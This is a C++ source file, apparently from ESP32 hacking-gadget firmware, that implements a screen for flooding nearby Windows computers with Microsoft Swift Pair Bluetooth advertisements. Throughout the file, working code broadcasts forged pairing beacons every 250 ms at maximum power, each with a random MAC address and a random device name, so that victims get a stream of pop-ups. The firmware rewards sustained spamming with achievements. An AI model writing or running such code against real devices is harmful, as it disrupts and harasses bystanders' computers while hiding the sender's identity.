#include "BLEWindowsSpamScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/ble/BLEDeviceSpamMenuScreen.h"

extern "C" int ble_hs_id_set_rnd(const uint8_t *addr);

static constexpr const char kNameChars[] =
  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ";
static constexpr int kNameCharsLen = sizeof(kNameChars) - 1;

// ── Lifecycle ──────────────────────────────────────────────────────────────

BLEWindowsSpamScreen::~BLEWindowsSpamScreen()
{
  _stop();
}

void BLEWindowsSpamScreen::onInit()
{
  int n = Achievement.inc("ble_spam_first");
  if (n == 1) Achievement.unlock("ble_spam_first");
  _spamStartMs   = millis();
  _spam1minFired = false;

  NimBLEDevice::init("");
  NimBLEDevice::setPower(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
  NimBLEDevice::setPower(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_DEFAULT);
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  _pAdv = NimBLEDevice::getAdvertising();
  _pAdv->setAdvertisementType(BLE_GAP_CONN_MODE_UND);  // connectable — Swift Pair toast
  _pAdv->setMinInterval(0x20);
  _pAdv->setMaxInterval(0x30);
  _pAdv->setScanResponse(false);

  _spam();
}

void BLEWindowsSpamScreen::onUpdate()
{
  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stop();
      Screen.goBack();
      return;
    }
  }

  uint32_t now = millis();
  if (!_spam1minFired && now - _spamStartMs >= 60000) {
    _spam1minFired = true;
    int m = Achievement.inc("ble_spam_1min");
    if (m == 1) Achievement.unlock("ble_spam_1min");
  }
  if (now - _lastSpamMs >= 250) {
    _lastSpamMs = now;
    _spam();
  }
  if (now - _lastDrawMs >= 2000) {
    _lastDrawMs = now;
    _spinIdx    = (_spinIdx + 1) % 4;
    render();
  }
}

void BLEWindowsSpamScreen::onRender()
{
  auto& lcd = Uni.Lcd;

  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    lcd.setTextDatum(BC_DATUM);
    lcd.setTextColor(TFT_DARKGREY, TFT_BLACK);
    lcd.drawString("BACK / ENTER: Stop", bodyX() + bodyW() / 2, bodyY() + bodyH());
    _chromeDrawn = true;
  }

  const int labelH = lcd.fontHeight() + 4;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), labelH);
  sp.fillSprite(TFT_BLACK);
  sp.setTextDatum(MC_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  String label = String("[") + _spinner[_spinIdx] + "] Spamming...";
  sp.drawString(label.c_str(), bodyW() / 2, labelH / 2);
  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}

// ── Private ────────────────────────────────────────────────────────────────

void BLEWindowsSpamScreen::_spam()
{
  if (_pAdv) _pAdv->stop();

  uint8_t addr[6];
  esp_fill_random(addr, 6);
  addr[5] |= 0xC0;
  ble_hs_id_set_rnd(addr);

  // Microsoft Swift Pair beacon (manufacturer data, company ID 0x0006):
  //   06 00 | 03 | 00 | 80 | <display name bytes>
  //   ^company ^beacon ^sub  ^reserved-RSSI
  const int nameLen = (int)random(6, 16);              // 6..15 char shown name
  uint8_t mfg[5 + 15];
  mfg[0] = 0x06; mfg[1] = 0x00;                         // Microsoft company ID
  mfg[2] = 0x03;                                        // Microsoft Beacon ID
  mfg[3] = 0x00;                                        // Beacon sub-scenario
  mfg[4] = 0x80;                                        // reserved (flags/RSSI)
  for (int i = 0; i < nameLen; i++)
    mfg[5 + i] = (uint8_t)kNameChars[random(0, kNameCharsLen)];

  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);
  advData.setManufacturerData(std::string((char*)mfg, 5 + nameLen));

  _pAdv->setAdvertisementData(advData);
  _pAdv->start();
}

void BLEWindowsSpamScreen::_stop()
{
  if (_pAdv) {
    _pAdv->stop();
    _pAdv = nullptr;
  }
  NimBLEDevice::deinit(true);
}
